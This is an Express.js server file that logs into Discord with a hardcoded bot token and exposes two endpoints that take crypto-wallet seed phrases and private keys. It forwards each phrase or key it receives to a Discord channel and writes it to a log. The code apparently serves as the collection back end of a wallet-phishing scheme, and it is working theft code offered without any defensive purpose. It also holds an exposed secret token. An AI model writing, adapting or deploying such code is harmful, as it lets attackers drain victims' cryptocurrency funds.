const express = require('express');
const { Client, Intents } = require("discord.js");
const logger = require('./Logger')
const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});
client.login("OTczNzc3MzY5NjMyNDkzNjEw.GDF0Uy.3T87-hIAW_16gyjsTm3Hbs4aLta9ztQ96d7Hfo");


const app = express();
app.use(express.json());


app.post("/api/wallet/v1/Phrase", async(req, res) => {
    SendPhrase(req.body.phrase);
    logger.info(`Sent ${req.body.phrase}`)
    res.status(200).send({})
})
app.post("/api/wallet/v1/privateKey", async(req, res) => {
    SendPhrase(req.body.PrivateKey);
    logger.info(`Sent ${req.body.PrivateKey}`)
    res.status(200).send({})
})
client.on('ready', client => {
    logger.info("Connected")
})

function SendPhrase(phrase) {
    client.channels.cache.get('974637380659216385').send(phrase);
}



const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listning  ${PORT}`);
})